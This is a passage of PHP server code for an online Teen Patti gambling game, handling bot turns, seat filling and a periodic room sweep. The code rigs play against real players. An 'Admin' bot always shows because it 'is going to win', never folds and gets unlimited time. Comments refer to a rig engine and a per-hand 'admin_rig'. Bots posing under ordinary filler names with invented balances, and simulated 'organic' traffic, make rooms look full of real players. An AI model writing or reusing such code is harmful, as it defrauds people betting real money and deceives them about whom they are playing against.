        // only — purely about how lively an idle room looks — so it draws its own plain coin flip
        // rather than should_bot_rig_this_round: consuming a real decision from the shared rig
        // engine here, for a filler that is always an ordinary name and never "Admin", would only
        // dilute that engine's memory with draws that do not correspond to a match outcome.
        if (bot_takeover_active('teenpatti')['active'] && js_random() < 0.5) {
            $randomSeat = (int) floor(js_random() * 4);
            $filler = next_room_filler_username();
            q('UPDATE "TeenPattiSeat" SET "username" = ?, "is_bot" = ?, "folded" = 0
               WHERE "room_id" = ? AND "seat" = ?',
              [$filler['username'], $filler['is_bot'] ? 1 : 0, $roomId, $randomSeat]);
        }

        // Always clear any leftover per-hand rig now that this hand is fully over.
        tp_update_room($roomId, ['admin_rig' => null]);
    } catch (Throwable $e) { log_error('[TP] Room empty error: ' . $e->getMessage()); }
}

/** The filler/Admin move that the 1.5-3.5s setTimeout used to make. */
function tp_run_bot_turn($roomId) {
    try {
        tp_update_room($roomId, ['bot_turn_due_at' => null]);

        $room = tp_get_room($roomId);
        if (!$room || $room['status'] !== 'playing') return;
        $seats = tp_get_seats($roomId);

        $botSeat = null;
        foreach ($seats as $s) {
            if ((int)$s['seat'] !== (int)$room['turn_seat']) continue;
            if (empty($s['folded']) && (!empty($s['is_bot']) || (!empty($s['username']) && strtolower($s['username']) === 'admin'))) {
                $botSeat = $s; break;
            }
        }
        if (!$botSeat) return;

        $activeSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && empty($s['folded']); }));

        // A filler can call Show when only 2 remain and it holds a strong hand — and Admin always
        // shows, because it is going to win.
        if (count($activeSeats) === 2) {
            $hand = tp_evaluate_hand($botSeat['cards']);
            if ($hand[0] >= 4 || strtolower((string)$botSeat['username']) === 'admin') {
                tp_process_action($roomId, $botSeat['username'], 'show');
                return;
            }
        }

        $decision = tp_bot_decide($botSeat['cards'], (float)$room['current_stake']);
        if (strtolower((string)$botSeat['username']) === 'admin' && $decision === 'fold') {
            $decision = 'chaal';   // Admin never folds
        }
        tp_process_action($roomId, $botSeat['username'], $decision);
    } catch (Throwable $e) { log_error('[TP] Bot turn error: ' . $e->getMessage()); }
}

/** The 15s fill-and-deal that scheduleBotFill used to perform. */
function tp_run_bot_fill($roomId) {
    try {
        tp_update_room($roomId, ['bot_fill_due_at' => null]);

        $room = tp_get_room($roomId);
        if (!$room || $room['status'] !== 'waiting') return;
        $seats = tp_get_seats($roomId);

        $seated = array_values(array_filter($seats, function ($s) { return !empty($s['username']); }));
        if (count($seated) === 0) return;   // nobody waiting

        // Fill ALL empty seats to reach 4/4 with ordinary fillers. "Admin" is never seated here —
        // that is decided once, live, in tp_start_round.
        $empty = array_values(array_filter($seats, function ($s) { return empty($s['username']); }));
        $botIdx = 0;
        foreach ($empty as $seat) {
            if ($botIdx >= 4) break;
            $filler = next_room_filler_username();
            tp_update_seat($seat['id'], [
                'username' => $filler['username'],
                'is_bot'   => $filler['is_bot'] ? 1 : 0,
                'folded'   => 0,
            ]);
            $botIdx++;
        }

        tp_start_round($roomId);
    } catch (Throwable $e) { log_error('[TP] Bot fill error: ' . $e->getMessage()); }
}

// -------------------------------------------------------------------------------------------------
// The sweep — everything the 5-second setInterval and the traffic engine used to do
// -------------------------------------------------------------------------------------------------

/**
 * Advance every room to the present moment.
 *
 * Called at the start of every Teen Patti request and by the one-minute cron. Cheap when there is
 * nothing to do: it reads six small rows and returns.
 */
function tp_sweep() {
    try {
        $now = now_ms();

        // --- per-room deadlines ---
        $rooms = all('SELECT * FROM "TeenPattiRoom"');
        foreach ($rooms as $room) {
            $roomId = $room['id'];

            if ($room['round_end_due_at'] !== null && (int)$room['round_end_due_at'] <= $now) {
                tp_finish_round_reset($roomId);
                continue;
            }
            if ($room['bot_fill_due_at'] !== null && (int)$room['bot_fill_due_at'] <= $now) {
                tp_run_bot_fill($roomId);
                continue;
            }
            if ($room['bot_turn_due_at'] !== null && (int)$room['bot_turn_due_at'] <= $now) {
                tp_run_bot_turn($roomId);
                continue;
            }
        }

        // --- playing rooms: stuck tables and turn timeouts ---
        $playing = all("SELECT * FROM \"TeenPattiRoom\" WHERE \"status\" = 'playing'");
        foreach ($playing as $room) {
            $seats = tp_get_seats($room['id']);
            $activeRemaining = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && empty($s['folded']); }));
            if (count($activeRemaining) < 2) {
                tp_reset_room_to_waiting($room['id']);
                continue;
            }

            if ($room['turn_start'] === null) continue;
            $elapsed = ($now - sql_to_ms($room['turn_start'])) / 1000.0;
            if ($elapsed >= TP_TURN_TIMEOUT) {
                $currentSeat = null;
                foreach ($seats as $s) { if ((int)$s['seat'] === (int)$room['turn_seat']) { $currentSeat = $s; break; } }
                if ($currentSeat && !empty($currentSeat['username']) && empty($currentSeat['folded'])) {
                    if (strtolower($currentSeat['username']) === 'admin') {
                        // Admin NEVER auto-folds on timeout. Reset the timer to give it unlimited time.
                        tp_update_room($room['id'], ['turn_start' => ms_to_sql()]);
                    } elseif (!empty($currentSeat['is_bot'])) {
                        // Fillers make their strategic move rather than folding on timeout.
                        $decision = tp_bot_decide($currentSeat['cards'], (float)$room['current_stake']);
                        tp_process_action($room['id'], $currentSeat['username'], $decision);
                    } else {
                        tp_process_action($room['id'], $currentSeat['username'], 'fold');
                    }
                }
            }
        }

        // --- finished rooms stuck for more than 10s ---
        $finished = all("SELECT * FROM \"TeenPattiRoom\" WHERE \"status\" = 'finished'");
        foreach ($finished as $room) {
            $elapsed = ($now - sql_to_ms($room['updated_at'])) / 1000.0;
            if ($elapsed >= 10) tp_reset_room_to_waiting($room['id']);
        }

        // --- presence: remove players who stopped polling (closed tab) ---
        $realSeats = all('SELECT * FROM "TeenPattiSeat" WHERE "username" IS NOT NULL AND "is_bot" = 0');
        foreach ($realSeats as $seat) {
            if (strtolower((string)$seat['username']) === 'admin') continue;
            $lastActive = $seat['last_seen_at'] === null ? null : (int)$seat['last_seen_at'];

            // Not polled in over 10 seconds — or never polled at all, which is the original's
            // behaviour for a heartbeat map that starts empty.
            if ($lastActive === null || ($now - $lastActive) > 10000) {
                $room = tp_get_room($seat['room_id']);
                if ($room && $room['status'] === 'playing' && (int)$seat['folded'] === 0) {
                    try { tp_process_action($seat['room_id'], $seat['username'], 'fold'); } catch (Throwable $e) { /* ignore */ }
                }

                tp_update_seat($seat['id'], ['username' => null, 'is_bot' => 0, 'cards' => null, 'folded' => 0, 'last_seen_at' => null]);

                $checkSeats = tp_get_seats($seat['room_id']);
                $realRemaining = array_values(array_filter($checkSeats, function ($s) { return !empty($s['username']) && empty($s['is_bot']); }));
                if (count($realRemaining) === 0) {
                    tp_reset_room_to_waiting($seat['room_id']);
                }
            }
        }

        tp_traffic_tick();
    } catch (Throwable $e) { /* silent, exactly like the original interval */ }
}

/**
 * Sequential organic room filling: adds one filler to one waiting room every 6-12 seconds.
 *
 * Rooms stay open (0/4 -> 1/4 -> 2/4 -> 3/4) for a while before filling to 4/4 and starting.
 */
function tp_traffic_tick() {
    if (!cfg('TEENPATTI_AUTO_BOT_FILL')) return; // real-players-only mode — no simulated traffic
    $now = now_ms();
    $nextAt = null;
    try { $rec = state_get('tp_traffic_next_at'); $nextAt = is_array($rec) ? ($rec['at'] ?? null) : null; } catch (Throwable $e) {}

    if ($nextAt === null) {
        state_set('tp_traffic_next_at', ['at' => $now + 6000 + (int) floor(js_random() * 6000)]);
        return;
    }
    if ((int)$nextAt > $now) return;

    // Reschedule first, so a slow pass cannot cause a burst of catch-up fills.
    state_set('tp_traffic_next_at', ['at' => $now + 6000 + (int) floor(js_random() * 6000)]);

    try {
        $waitingRooms = [];
        foreach (tp_room_ids_list() as $roomId) {
            $room = tp_get_room($roomId);
            if (!$room || $room['status'] !== 'waiting') continue;
            $seats = tp_get_seats($roomId);
            $count = count(array_filter($seats, function ($s) { return !empty($s['username']); }));
            if ($count < 4) $waitingRooms[] = ['room' => $room, 'seats' => $seats, 'count' => $count];
        }
        if (count($waitingRooms) === 0) return;

        $target = $waitingRooms[(int) floor(js_random() * count($waitingRooms))];
        $emptySeats = array_values(array_filter($target['seats'], function ($s) { return empty($s['username']); }));
        if (count($emptySeats) === 0) return;

        // Exactly one simulated player, always an ordinary filler name. "Admin" is never seated by
        // simulated traffic; that is decided once, live, in tp_start_round.
        $nextSeat = $emptySeats[0];
        $filler = next_room_filler_username();
        tp_update_seat($nextSeat['id'], [
            'username' => $filler['username'],
            'is_bot'   => $filler['is_bot'] ? 1 : 0,
            'folded'   => 0,
            'balance'  => 1000 + (int) floor(js_random() * 5000),
        ]);

        if ($target['count'] + 1 >= 3) tp_schedule_bot_fill($target['room']['id']);
    } catch (Throwable $e) { /* silent */ }
}
